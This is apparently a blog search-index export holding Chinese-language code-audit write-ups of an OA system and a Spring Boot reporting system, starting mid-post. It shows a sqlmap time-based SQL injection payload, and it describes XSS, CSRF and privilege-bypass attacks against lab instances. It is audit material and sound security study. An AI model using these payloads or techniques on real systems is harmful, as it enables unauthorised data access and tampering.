alt="img"></p><p>​根据路由，我们来到通知列表，又根据查询语句猜测，该处实现的功能点是搜索功能。随便搜索后抓包，抓得如下数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/informlistpaging?baseKey=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.46.127:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.46.127:8888/infromlist</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=1E514058317178F919F2084D177556DE</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​直接扔给sqlmap就能跑出来，payload如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.21.46.127:8888/informlistpaging?baseKey=&#x27; AND (SELECT 7001 FROM (SELECT(SLEEP(5)))nIdf) AND &#x27;FglX&#x27;=&#x27;FglX</span><br></pre></td></tr></table></figure><h3 id="2、任意文件操控（读取，写入，上传）"><a href="#2、任意文件操控（读取，写入，上传）" class="headerlink" title="2、任意文件操控（读取，写入，上传）"></a>2、任意文件操控（读取，写入，上传）</h3><p>​根据前端的文件管理里的文件管理功能点，点击上传，定位路由在&#x2F;fileupload。</p><p>​经过审计和测试发现确实不拦截任何的文件上传，但是由于该项目不解析JSP，jar包也无法执行，文件的名字也遭到了修改，无法目录穿透，因此该漏洞无法利用。</p><p>​同时该功能点中也存在下载文件的功能，但是由于该下载功能使用的是id查询数据库中文件的信息，再进行下的方式进行的下载，因此不存在任意文件下载。</p><p>​并未找到文件读取的功能点。</p><h3 id="3、SSRF"><a href="#3、SSRF" class="headerlink" title="3、SSRF"></a>3、SSRF</h3><p>​该项目没有找到远程请求的实现。</p><h3 id="4、XXE"><a href="#4、XXE" class="headerlink" title="4、XXE"></a>4、XXE</h3><p>​项目中没有找到解析XML的功能点。</p><h3 id="5、模板注入"><a href="#5、模板注入" class="headerlink" title="5、模板注入"></a>5、模板注入</h3><p>​根据依赖包中的信息我们可知，该项目使用freemark作为模板引擎，但并未找到任何修改模板和上传模板的功能点。</p><h3 id="6、命令执行"><a href="#6、命令执行" class="headerlink" title="6、命令执行"></a>6、命令执行</h3><p>​没有找到命令执行的代码实现</p><h2 id="三、前端渗透测试"><a href="#三、前端渗透测试" class="headerlink" title="三、前端渗透测试"></a>三、前端渗透测试</h2><h3 id="1、XSS"><a href="#1、XSS" class="headerlink" title="1、XSS"></a>1、XSS</h3><p>​经过测试，可以发现该项目多处存在XSS漏洞。</p><p><img src="/img/oasys-1/8.png" alt="image-20241122140628778"></p><h3 id="2、越权漏洞"><a href="#2、越权漏洞" class="headerlink" title="2、越权漏洞"></a>2、越权漏洞</h3><p>​创建一个低权限用户，登陆后我们使用该低权限的cookie去测试。</p><p>​经过测试发现该项目多处存在越权漏洞。</p><p>​如类型管理，我们使用admin创建一个test：</p><p><img src="/img/oasys-1/9.png" alt="image-20241122141354390"></p><p>​点击删除后抓包，将admin用户的cookie替换为test用户的cookie</p><p>​再查看类型管理我们可以看到test已被删除。</p><h3 id="3、CSRF"><a href="#3、CSRF" class="headerlink" title="3、CSRF"></a>3、CSRF</h3><p>​我们以test用户的身份写一个便签test：</p><p><img src="/img/oasys-1/10.png" alt="img"></p><p>​抓包后，使用BP自动创建一个CSRF的利用POC。</p><p>​我们再以管理员的身份去访问这个POC</p><p><img src="/img/oasys-1/11.png" alt="img"></p><p>​可以看到，我们成功触发攻击。从前面我们可知该项目存在多出的XSS漏洞，那么我们XSS+CSRF即可实现以管理员的身份创建一个便签，并对管理实现XSS攻击。</p><p>​以test用户的身份创建一个便签，并写上XSS攻击的payload：</p><p><img src="/img/oasys-1/12.png" alt="img"></p><p>​同样的我们使用BP创建攻击POC，然后以管理员身份访问</p><p><img src="/img/oasys-1/13.png" alt="img"></p><p>​可以看到成功触发攻击。</p><p>​至此该OA系统审计完毕。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intelligent reporting system-1</title>
      <link href="/2024/11/13/Intelligent-reporting-system/"/>
      <url>/2024/11/13/Intelligent-reporting-system/</url>
      
        <content type="html"><![CDATA[<p>项目结构：spring boot+maven</p><h1 id="一、项目依赖审计"><a href="#一、项目依赖审计" class="headerlink" title="一、项目依赖审计"></a>一、项目依赖审计</h1><p>项目依赖没有发现已披露的漏洞</p><h1 id="二、单点漏洞审计"><a href="#二、单点漏洞审计" class="headerlink" title="二、单点漏洞审计"></a>二、单点漏洞审计</h1><h2 id="SQL："><a href="#SQL：" class="headerlink" title="SQL："></a>SQL：</h2><p>根据依赖包我们可以发现项目使用的mybatis<br>所以我们在xml文件中搜索${</p><p><img src="/img/Intelligent-reporting-system/1.png" alt="image"></p><p>发现有这些地方使用了$，也就是可能存在SQL注入，我们一个一个看：</p><h3 id="1、IgReportMapper-xml"><a href="#1、IgReportMapper-xml" class="headerlink" title="1、IgReportMapper.xml"></a>1、IgReportMapper.xml</h3><p><img src="/img/Intelligent-reporting-system/2.png" alt="image"></p><p>向上追溯：</p><p><img src="/img/Intelligent-reporting-system/3.png" alt="image"></p><p>猜测这里是我的任务模块的功能实现<br>根据这些代码，我们还需要将数据源选择为MySQL<br>所以我们创建一个这样的任务：</p><p><img src="/img/Intelligent-reporting-system/4.png" alt="image"></p><p>执行后查看日志：</p><p><img src="/img/Intelligent-reporting-system/5.png" alt="image"></p><p>成功获取库名。</p><h3 id="2、TidbMapper-xml"><a href="#2、TidbMapper-xml" class="headerlink" title="2、TidbMapper.xml"></a>2、TidbMapper.xml</h3><p><img src="/img/Intelligent-reporting-system/6.png" alt="image"></p><p>与上一个SQL业务逻辑相同，只是需要修改数据源：</p><p><img src="/img/Intelligent-reporting-system/7.png" alt="image"></p><h3 id="3、XxlJobInfoMapper-xml"><a href="#3、XxlJobInfoMapper-xml" class="headerlink" title="3、XxlJobInfoMapper.xml"></a>3、XxlJobInfoMapper.xml</h3><p><img src="/img/Intelligent-reporting-system/8.png" alt="image"></p><p><img src="/img/Intelligent-reporting-system/9.png" alt="image"></p><p>在这个文件中这是一个update语句，我们向上追溯：<br>这里没有对传参进行过滤或者修改，且有两个控制器调用了这个update语句，我们一个一个看：</p><h3 id="JobInfoController-java"><a href="#JobInfoController-java" class="headerlink" title="JobInfoController.java"></a>JobInfoController.java</h3><p>这个控制器前端没找到调用的功能点，尝试拼接路由发现缺少描述，查看类的属性也没有描述的属性，所以判断这个控制器已经完全弃用。</p><h3 id="ReportInfoController-java"><a href="#ReportInfoController-java" class="headerlink" title="ReportInfoController.java"></a>ReportInfoController.java</h3><p>经过测试，发现两个注入点均为int类型，且未被使用，因此无法进行SQL注入<br>任意文件操作（上传、读取、写入）：<br>未找到任何有关文件操作的代码实现</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF:"></a>SSRF:</h2><p>未找到任何远程HTTP请求的代码实现</p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE:"></a>XXE:</h2><p>未找到任何XML解析的代码实现</p><h2 id="URL跳转："><a href="#URL跳转：" class="headerlink" title="URL跳转："></a>URL跳转：</h2><p>黑盒测试过程中未发现类似于URL的参数</p><h2 id="模板注入："><a href="#模板注入：" class="headerlink" title="模板注入："></a>模板注入：</h2><p>分析依赖发现使用了Freemark作为模板引擎，但没有找到Freemark的模板</p><h2 id="SpEL注入："><a href="#SpEL注入：" class="headerlink" title="SpEL注入："></a>SpEL注入：</h2><p>没有找到任何SpEL的实现</p><h1 id="三、前端渗透测试"><a href="#三、前端渗透测试" class="headerlink" title="三、前端渗透测试"></a>三、前端渗透测试</h1><h2 id="XSS注入："><a href="#XSS注入：" class="headerlink" title="XSS注入："></a>XSS注入：</h2><p>1、在SQL注入中，我们发现日志中也存在XSS注入，于是我们创建一个如下的任务：</p><p><img src="/img/Intelligent-reporting-system/11.png" alt="image"></p><p>执行后查看日志：</p><p><img src="/img/Intelligent-reporting-system/12.png" alt="image"></p><p>在首页中的最近任务耗时，当鼠标悬停于任务名字设置为XSSpayload的任务时，也会触发XSS</p><h2 id="越权漏洞："><a href="#越权漏洞：" class="headerlink" title="越权漏洞："></a>越权漏洞：</h2><p>我们先创建一个test用户，登陆后，保存test用户的cookie，用于测试<br>1、我的任务功能存在垂直越权<br>在我的任务模块，使用admin用户创建一个任务，再使用test用户创建一个任务。</p><p><img src="/img/Intelligent-reporting-system/13.png" alt="image"></p><p><img src="/img/Intelligent-reporting-system/14.png" alt="image"></p><p>使用test用户点击删除自己的任务后抓包。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/jobinfo/remove HTTP/1.1</span><br><span class="line">Host: 172.24.95.92:8888</span><br><span class="line">Content-Length: 8</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Origin: http://172.24.95.92:8888</span><br><span class="line">Referer: http://172.24.95.92:8888/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: XXL_JOB_LOGIN_IDENTITY=7b226964223a332c22757365726e616d65223a2274657374222c2270617373776f7264223a223039386636626364343632316433373363616465346538333236323762346636222c22726f6c65223a302c227065726d697373696f6e223a2231227d</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;id&quot;:2&#125;</span><br></pre></td></tr></table></figure><p>修改id为admin用户所创建任务的id，也就是3。发送数据包。</p><p><img src="/img/Intelligent-reporting-system/15.png" alt="image"></p><p>成功删除admin用户的任务，编辑功能同样存在越权漏洞，甚至可以直接将admin用户的任务变为自己的任务<br>至此，第一套报表系统源码审计结束。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
